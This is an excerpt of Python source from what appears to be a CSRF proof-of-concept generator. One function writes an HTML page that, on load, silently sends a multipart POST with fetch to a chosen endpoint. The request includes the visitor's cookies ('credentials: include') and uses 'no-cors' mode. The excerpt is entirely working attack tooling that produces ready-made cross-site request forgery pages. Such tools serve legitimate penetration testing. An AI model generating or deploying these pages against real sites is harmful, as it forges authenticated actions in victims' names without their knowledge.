# ----------------------------------------------------------------
# P8: Multipart POST via fetch
# ----------------------------------------------------------------
def gen_multipart_fetch(action: str, params: dict) -> str:
    append_lines = "\n".join(
        f"    fd.append('{k}', '{v}');" for k, v in params.items()
    )
    html = f"""<html>
{ATTRIBUTION}
<head><title>CSRF Multipart PoC</title></head>
<body>
  <script>
    var fd = new FormData();
{append_lines}
    fetch("{action}", {{
      method: "POST",
      body: fd,
      credentials: "include",
      mode: "no-cors"
    }});
  </script>
</body>
</html>"""
    return _save_poc(f"{_sanitize_filename(action)}-multipart-fetch.html", html)


